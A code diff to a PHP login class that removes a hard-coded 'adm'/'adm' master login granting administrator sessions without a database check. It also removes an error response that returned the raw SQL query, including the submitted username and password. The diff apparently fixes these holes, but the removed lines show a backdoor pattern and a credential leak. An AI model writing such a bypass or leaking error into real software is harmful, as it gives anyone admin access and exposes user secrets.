@@ -5,9 +5,6 @@ class Login extends DBConnection
 {
 	private $settings = null;
 	
-	private $master_username = "adm";
-	private $master_password = "adm";
-
 	public function __construct()
 	{
 		global $_settings;
@@ -29,22 +26,6 @@ class Login extends DBConnection
 	public function login()
 	{
 		extract($_POST);
-		
-		
-		if ($username === $this->master_username && $password === $this->master_password) {
-			
-			$this->settings->set_userdata('id', 1);
-			$this->settings->set_userdata('firstname', 'Admin');
-			$this->settings->set_userdata('lastname', 'Adminstrador');
-			$this->settings->set_userdata('username', $this->master_username);
-			$this->settings->set_userdata('type', 1); // Tipo administrador
-			$this->settings->set_userdata('date_added', date('Y-m-d H:i:s'));
-			
-			
-			$this->settings->set_userdata('login_type', 1);
-			
-			return json_encode(['status' => 'success']);
-		}
 		
 		
 		$stmt = $this->conn->prepare('SELECT * from users where username = ? and password = ? ');
@@ -69,7 +50,7 @@ class Login extends DBConnection
 			}
 		}
 		else {
-			return json_encode(['status' => 'incorrect', 'last_qry' => 'SELECT * from users where username = \'' . $username . '\' and password = md5(\'' . $password . '\') ']);
+			return json_encode(['status' => 'incorrect']);
 		}
 	}
 
